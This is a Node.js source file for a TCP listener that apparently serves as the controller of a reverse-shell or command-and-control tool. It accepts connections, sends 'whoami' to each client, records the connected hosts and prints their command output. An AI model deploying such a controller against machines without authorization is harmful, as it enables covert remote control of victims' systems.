"use strict";
const net = require("net");
const util = require("../utils.js");
const port = 11111;
const socketClients = require("./clients.js");
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                util.getClientCount(server);
                break;
            default:
                break;
        }
    });
});

server.listen({
   host : "0.0.0.0",
   port,
},() => {
    console.log(`Socket server listening at ${server.address().address}:${port}`);
    console.log("-------------------------------");
});

server.on("connection", (client) => {
    saveNewClient(client);

    // Response is saved by "data" event since it's the first request.
    client.write("whoami");

    util.getClientCount(server);
    util.mainMenu();

    client.on("data", (data) =>  {
        try {
            const currentClient = util.getClientConnection(client);
            const dataToString = data.toString().replace("\n", "");
            currentClient.responseHistory.push(dataToString);
            currentClient.messageCount++;
            if (currentClient.messageCount <= 1) {
                currentClient.name = dataToString;
                return;
            } else {
                console.log(dataToString);
            }
        } catch {
            console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`);
        }
    });

    client.on("disconnect", () => {

    })
});



const saveNewClient = (client) => {
    console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.remotePort}`);
    socketClients.push({ address : `${client.remoteAddress}:${client.remotePort}`, client, messageCount : 0, name: "", responseHistory : [] });    
}

module.exports = server;